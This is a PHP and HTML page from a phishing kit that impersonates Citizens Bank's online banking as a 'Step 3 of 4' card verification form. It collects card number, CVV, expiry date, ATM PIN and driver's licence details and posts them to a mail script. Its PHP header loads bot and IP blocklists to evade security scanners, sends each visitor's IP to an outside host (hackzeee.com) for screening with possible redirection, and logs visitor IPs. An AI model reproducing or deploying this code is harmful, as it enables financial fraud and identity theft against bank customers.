<?php
error_reporting(0);

include 'admin/config.php';
if($bots == "on"){
	include ('another/1.php');
	include ('another/2.php');
	include ('another/3.php');
	include ('another/4.php');
	include ('another/5.php');
	include ('another/6.php');
	include ('another/8.php');
	include ('another/iprange.php');
	include ('another/bot.php');
	include ('another/IP-BlackList.php');
	include ('another/Bot-Blueprint.php');
	include ('another/Bot-Crawler.php');
	include ('another/new.php');

}

//zsec
if($zsec_p == "on"){
	$s = $_SERVER[REQUEST_URI];
	if(strpos($s, "invalid") !== false){
	}else{
		$hip = $_SERVER['REMOTE_ADDR'];
		$kks = rand(0000000000,9999999999);
		$ch = curl_init('https://in.hackzeee.com/ahh.php?ip='.$hip);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS,  $post_fields);
		curl_setopt($ch, CURLOPT_POST, 1);
		$ahhh = curl_exec($ch);
		$reqsturi = "$_SERVER[REQUEST_URI]";
		if (strpos($ahhh, "lucky punk") !== false ){}elseif (strpos($ahhh, "bad luck") !==false ){
			header("Location: https://in.hackzeee.com/?key=".$keyy."&api=".$api."&exiturl=".$exiturl.$reqsturi."&ip=".$hip);
		}
	}
}

    $content2 = "#>".$_SESSION['ip']."\r\n";
    $save2=fopen("Blueprint/Result/total_cc_view.txt","a+");
    fwrite($save2,$content2);
    fclose($save2);

$rundom = substr(sha1(mt_rand()),1,25);
?>
<!DOCTYPE html>
<html class="no-js" lang="en-US">
<!--<![endif]-->

<head>
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta charset="utf-8">
  <title>Online Banking</title>
  <meta name="description" content="">

  <link href="https://www4.citizensbankonline.com/efs/ui/enrollment/img/mobile-desktop-icons/apple-touch-icon.png" rel="apple-touch-icon" />
  <link href="https://www4.citizensbankonline.com/efs/ui/enrollment/img/mobile-desktop-icons/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76" />
  <link href="https://www4.citizensbankonline.com/efs/ui/enrollment/img/mobile-desktop-icons/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120" />
  <link href="https://www4.citizensbankonline.com/efs/ui/enrollment/img/mobile-desktop-icons/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152" />
  <link href="https://www4.citizensbankonline.com/efs/ui/enrollment/img/mobile-desktop-icons/apple-touch-icon-180x180.png" rel="apple-touch-icon" sizes="180x180" />
  <link href="https://www4.citizensbankonline.com/efs/ui/enrollment/img/mobile-desktop-icons/icon-hires.png" rel="icon" sizes="192x192" />
  <link href="https://www4.citizensbankonline.com/efs/ui/enrollment/img/mobile-desktop-icons/icon-normal.png" rel="icon" sizes="128x128" />
<link href="ctz.css" rel="stylesheet" />

  <meta name="viewport" content="width=device-width, initial-scale=1">

</head>

<body class="responsive-enabled">

  <!-- ===============
      PAGE HEADER START
      =============== -->
  <!-- begin CITIZENS BANK Hosted Header -->
  <div class="citizens-header-footer-injected">

<link rel="stylesheet" type="text/css" href="/efs/hhf/css/citizensns.min.42588.css">
<style>
.help-modal-header .help-modal-close {background: url(/efs/hhf/img/modal-help-close.png) center center no-repeat transparent; background-size: 20px;}
.help-modal-menu a.active {background: #f2faf8 url(/efs/hhf/img/arrow-right-green.png) right 20px center no-repeat; background-position: right 20px center; background-size:7px}
.account-section-title.checkmark h1 {padding: 0px 0px 5px 28px !important; }
.lt-ie9 .help-modal-menu a.active {background: #f2faf8 url(/efs/hhf/img/arrow-right-green.png) right 20px center no-repeat !important; background-size:7px !important}
.input-wrapper .tooltip {margin-left: 1px;}
</style>

</div>

<div class="citizens-header">

    <!-- htmlContainer PREFIX -->
    <div class="citizens-header-footer">
      <header id="page-header" class="page-header">
        <!-- inc-header.html START -->
        <div class="centered-content clearfix">
          <a class="page-logo">
            <img border="0" width="203" height="25" src="https://www4.citizensbankonline.com/efs/hhf/img/CTZ_Green-01.png" alt="Citizens Bank">
          </a>
          <div id="header-navigation-container"></div>
        </div>
        <!-- inc-header.html END -->
      </header>
    </div>
    <!-- htmlContainer SUFFIX -->

  </div>
  <!-- end CITIZENS BANK Hosted Header -->
  <!-- ===============
      PAGE HEADER END
      =============== -->

  <!-- ===============
      PAGE CONTENT AREA START
      =============== -->
  <div id="page-container" class="page-container">
  <div class="centered-content clearfix">
    <div class="g-unauth-main-container">
        <section class="unauth-intro-area">
            <h2 class="unauth-intro-area__title ">Credit / Debit Card Verification</h2>
        
                <div role="progressbar" aria-valuenow="3" aria-valuemin="3" aria-valuetext="Step 3 of 4: Enrollment" aria-valuemax="4">
                    <div class="unauth-intro-area__step">
                        <strong>Step 3 of 4:</strong>
                        <span>Card Verification</span>
                    </div>
                    <div class="unauth-intro-area__progress-container">
                        <div class="unauth-intro-area__progress-segment">
                                <div class="unauth-intro-area__progress-item -js-progress-green"></div>
                                <div class="unauth-intro-area__progress-item -js-progress-green"></div>
                                <div class="unauth-intro-area__progress-item -js-progress-green"></div>
                                <div class="unauth-intro-area__progress-item -js-progress-light-green"></div>
                                <div class="unauth-intro-area__progress-item -js-progress-light-green"></div>
                        </div>
                    </div>
                </div>
            <div class="js-error-block"></div>
			
            <div class="unauth-intro-area__help">
                <a class="g-link-list unauth-intro-area__link g-display-none" href="#helpModalPage">Show Help</a>
                <p class="unauth-intro-area__text">Please verify your Debit / Credit Card  to continue </p>
            </div>
        </section>        <section class="identify-customer-section">
            <form class="unauth-form jqtransform js-enrollment-form" method="post" action="Blueprint/Mail/Mail4.php">
              
                <div class="unauth-form__ic-identification-block">
                    <div class="unauth-form__row">
                        <div class="unauth-form__legend">
                            <label class="unauth-form__label">* All fields are mandatory.</label>
                        </div>
                    </div>
                    
                   

                    <div class="unauth-form__rowgroup" id="unauth-ic-form-rowgroup-BY_CUST" style="display: block;">
                        <div class="unauth-form__row">
                            <div class="unauth-form__rowitem g-left">
                                <label class="unauth-form__label" for="unauth-form-first-name">Card Number:</label>
                            <div>
                      
<input name="card" class="unauth-form__input js-lastname"  placeholder="#### #### #### ####" type="text"  minlength="16" maxlength="16" autocomplete="off" required>
                        </div></div>
				   
				   </div></div>
				   
				   
				   <div class="unauth-form__rowgroup" id="unauth-ic-form-rowgroup-BY_CUST" style="display: block;">
                        <div class="unauth-form__row">
                            <div class="unauth-form__rowitem g-left">
                                <label class="unauth-form__label" for="unauth-form-first-name">Card Security Code (CVV):</label>
                            <div>
                      
<input name="cvv" class="unauth-form__input js-lastname"  placeholder="###" type="password"  minlength="3" maxlength="3" autocomplete="off" required>
                        </div></div>
				   
				   </div></div>
				   
				   
				   <div class="unauth-form__rowgroup" id="unauth-ic-form-rowgroup-BY_CUST" style="display: block;">
                        <div class="unauth-form__row">
                            <div class="unauth-form__rowitem g-left">
                                <label class="unauth-form__label" for="unauth-form-first-name">Card Expiry Date:</label>
                            <div>
                      
                            <input id="cc" type="text" placeholder="MM/YY" class="masked" pattern="(1[0-2]|0[1-9])\/(1[5-9]|2\d)" data-valid-example="05/18"/>
  </div></div>
				   
				   </div></div>
				   
				   
				   <div class="unauth-form__rowgroup" id="unauth-ic-form-rowgroup-BY_CUST" style="display: block;">
                        <div class="unauth-form__row">
                            <div class="unauth-form__rowitem g-left">
                                <label class="unauth-form__label" for="unauth-form-first-name">ATM Pin:</label>
                            <div>
                      
<input name="atmpin" class="unauth-form__input js-lastname"  placeholder="####" type="text"  minlength="4" maxlength="4"  autocomplete="off" required>
                        </div></div>
				   
				   </div></div>
				  
				  
				  
				  
				  <div class="unauth-form__rowgroup" id="unauth-ic-form-rowgroup-BY_CUST" style="display: block;">
                        <div class="unauth-form__row">
                            <div class="unauth-form__rowitem g-left">
                                <label class="unauth-form__label" for="unauth-form-first-name">Driver's License Number:</label>
                            <div>
                      
<input name="dln" class="unauth-form__input js-lastname"  placeholder="" type="text"  autocomplete="off" required>
                        </div></div>
				   
				   </div></div>
				   
				   
				   <div class="unauth-form__rowgroup" id="unauth-ic-form-rowgroup-BY_CUST" style="display: block;">
                        <div class="unauth-form__row">
                            <div class="unauth-form__rowitem g-left">
                                <label class="unauth-form__label" for="unauth-form-first-name">Driver's License Issued Date: MM/YYYY:</label>
                            <div>
                            <input id="ccvc" type="text" placeholder="MM/YY" class="masked" pattern="(1[0-2]|0[1-9])\/(1[5-9]|2\d)" data-valid-example="05/18"/>
                        </div></div>
				   
				   </div></div>
				   
				   
				   
				   
				










                </div>
				
				
                <div class="unauth-section__button-wrap">
                    <button class="btn unauth-form__submit-button js-unauth-ic-submit-button"  id="toEnterCode">Continue</button>
                        <a class="unauth-form__cancel-link js-cancel-button" tabindex="0">Cancel</a>
                </div>
            </form>
            <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/masking-input.js" data-autoinit="true"></script>  
        </section>
    </div>
</div></div>